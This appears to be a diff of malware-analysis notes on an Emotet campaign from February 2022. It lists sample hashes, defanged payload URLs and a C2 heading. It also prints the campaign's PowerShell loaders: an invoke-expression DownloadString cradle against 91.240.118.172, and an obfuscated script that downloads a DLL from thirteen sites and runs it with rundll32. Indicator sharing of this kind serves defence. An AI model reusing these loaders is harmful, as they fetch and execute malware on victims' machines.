@@ -1,37 +1,55 @@
 Emotet - e5 - 08.02.2022
 
-.xls 
+.xls 719900e330cecd87250ac1f6c31f2d6f42f226294fb011cf47c442f8d2b7455b
 
-.dll 
+.dll da6ce8966d86b8359b27559659ba1b51d41d6bc512667144d9ea9c6c31ec039b
 
-
-
+.ps1 
 
 # powershell snippet 0
 $c1 = "(New-Object Net.We"
 $c4 = "bClient).Downlo"
-$c3 = "adString('http://91.240.118.172/ss/ss.png')"
-$ji = "(New-Object Net.WebClient).DownloadString('http://91.240.118.172/ss/ss.png')"
-invoke-expression "(New-Object Net.WebClient).DownloadString('http://91.240.118.172/ss/ss.png')"|invoke-expression
+$c3 = "adString('hxxp://91.240.118.172/ss/ss.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ss/ss.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('hxxp://91.240.118.172/ss/ss.png')"|invoke-expression
 # powershell snippet 1
-(new-object net.webclient).downloadstring("http://91.240.118.172/ss/ss.png")
+(new-object net.webclient).downloadstring("hxxp://91.240.118.172/ss/ss.png")
+
+
+.png 
+
+$path = "C{Joo}:\{Joo}Prog{Joo}ramD{Joo}ata\M{Joo}ilossd.{Joo}dl{Joo}l".replace('{Joo}','');
+
+$web = New-Object net.webclient;
+$urls = "$url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$url9,$url10,$url11,$url12,$url13".split(",");
+foreach ($url in $urls) {
+   try {
+       $web.DownloadFile($url, $path);
+       if ((Get-Item $path).Length -ge 30000) {
+           [Diagnostics.Process];
+           break;
+       }
+   }
+   catch{}
+} 
+Sleep -s 3;cmd /c C:\Windows\SysWow64\rundll32.exe 'C:\ProgramData\Milossd.dll',KitKat;
 
 
 .dll drop
 
-http://mkdevcorp.com/cgi/33HhffLF60pcv/
-http://goncalves.com/counter/3OkjcVmCPdokTG/
-http://francisdifronzo.com/eln-images/T6yB/
-http://k7tgu.com/Bryce/UBfCU05bih/
-http://ronfrankproductions.com/4agreements/trEgS/
-http://topstravel.com/VPImages/dPW/
-http://urieprocor.com/cgi/m2m7z88gOsNceL/
-http://mardigrasslandscaping.com/cgi/w4BV/
-http://keyesforsteuben.com/cgi/vnBHCHIlWZx/
-http://casualenglishchat.com/cgi/6g0pcvCOYPZYn/
-http://grimmcm.com/cgi/6hoBPCb3E/
-http://intelfirm.com/eln-images/xaTiPeapzK/
-http://manningind.com/eln-images/rx7j2VVFK/
+hxxp://mkdevcorp.com/cgi/33HhffLF60pcv/
+hxxp://goncalves.com/counter/3OkjcVmCPdokTG/
+hxxp://francisdifronzo.com/eln-images/T6yB/
+hxxp://k7tgu.com/Bryce/UBfCU05bih/
+hxxp://ronfrankproductions.com/4agreements/trEgS/
+hxxp://topstravel.com/VPImages/dPW/
+hxxp://urieprocor.com/cgi/m2m7z88gOsNceL/
+hxxp://mardigrasslandscaping.com/cgi/w4BV/
+hxxp://keyesforsteuben.com/cgi/vnBHCHIlWZx/
+hxxp://casualenglishchat.com/cgi/6g0pcvCOYPZYn/
+hxxp://grimmcm.com/cgi/6hoBPCb3E/
+hxxp://intelfirm.com/eln-images/xaTiPeapzK/
+hxxp://manningind.com/eln-images/rx7j2VVFK/
 
 
 c2's
